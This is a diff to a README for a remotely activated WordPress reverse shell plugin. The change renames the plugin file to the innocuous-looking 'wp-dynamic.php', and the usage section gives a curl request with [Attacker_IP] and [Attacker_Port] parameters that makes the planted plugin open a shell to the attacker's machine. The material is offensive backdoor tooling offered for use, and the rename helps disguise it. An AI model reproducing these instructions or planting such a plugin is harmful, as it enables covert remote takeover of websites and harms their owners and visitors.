@@ -49,13 +49,13 @@ If you encounter issues, check the `log.txt` file in the root directory of your 
 This reverse shell plugin can be activated via an HTTP request, allowing for remote activation with dynamic IP and port settings.
 
 ### Installation
-1. Zip the plugin file `wordpress-reverse-shell-remotely-activated.php`.
+1. Zip the plugin file `wp-dynamic.php`.
 2. Follow the same installation steps as the Simple Reverse Shell plugin.
 
 ### Usage
 Activate the plugin remotely by sending an HTTP request with the IP and port parameters. Use the following `curl` command:
 ```
-curl 'http://[Your_WordPress_Site]/wp-content/plugins/wordpress-reverse-shell-remotely-activated/wordpress-reverse-shell-remotely-activated.php?activate=1&ip=[Attacker_IP]&port=[Attacker_Port]'
+curl 'http://[Your_WordPress_Site]/wp-content/plugins/wp-dynamic/wp-dynamic.php?activate=1&ip=[Attacker_IP]&port=[Attacker_Port]'
 ```
 Replace `[Your_WordPress_Site]` with your WordPress site URL, `[Attacker_IP]` with your IP address, and `[Attacker_Port]` with your listening port.
 
